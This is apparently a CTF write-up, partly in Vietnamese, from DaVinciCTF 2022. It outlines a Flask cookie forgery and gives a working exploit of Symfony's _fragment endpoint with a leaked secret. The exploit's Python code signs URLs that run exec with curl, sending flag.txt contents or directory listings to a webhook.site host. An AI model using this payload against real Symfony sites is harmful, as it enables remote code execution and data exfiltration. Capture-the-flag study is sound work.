# DaVinciCTF 2022

## CyberStreak v1.0

Bài này lười viết

Register => Login => flask-usisn => secret key => change cookie => id : 2 => flag



## 🎵

[Link tham khảo  phpinfo() exploite](https://www.ambionics.io/blog/symfony-secret-fragment)

![](<.gitbook/assets/image (54).png>)

Secret : 60b938ad59ac73568c7f2d6c282cd084

```
Hash
python -c "import base64, hmac, hashlib; print(base64.b64encode(hmac.HMAC(b'60b938ad59ac73568c7f2d6c282cd084', b'http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dexec%26command%3Dcurl+-v+https%3A%2F%2Fwebhook.site%2Fdf59b6a7-6276-4ae2-92cb-c04780961c31%3Fa%3D%60cat+..%2Fflag.txt+%7C+base64+-w+0%60%26return_value%3Dnull', hashlib.sha256).digest()))"

+goJNhk9dRIosdtznVeqQtlVzB3EyFEubDi2lQu6/IM=

```



```python
import base64
import hmac
import hashlib
import requests
import urllib.parse

from payload import FUNCTION_NAME

url = 'challs.dvc.tf:9000/_fragment'

secret = '60b938ad59ac73568c7f2d6c282cd084'

FUNCTION_NAME = 'exec'

Command = {'command': ''' curl -v https://webhook.site/df59b6a7-6276-4ae2-92cb-c04780961c31?a=`ls ./ | base64 -w 0`''', 'return_value': 'null'}

if FUNCTION_NAME != '':
    payload = url + '?path=_controller%3D' + FUNCTION_NAME + '%26'
    for i in range(len(list(Command))):
        payload += list(Command)[i] + '%3D' + urllib.parse.quote_plus(Command[list(Command)[i]])
        if i != len(list(Command)) - 1:
            payload += '%26'
else:
    payload = url

print('fail : ' , payload)

hash = base64.b64encode(hmac.HMAC(secret, bytes(payload, encoding='UTF-8'), hashlib.sha256).digest()).decode()

print('hash : ' , hash)

final_url = payload + ('?' if FUNCTION_NAME == '' else '&') + '_hash=' + urllib.parse.quote_plus(hash)

print('Final URL :', final_url)

print(requests.get(final_url).text)
# request to webhook => flag base64
```
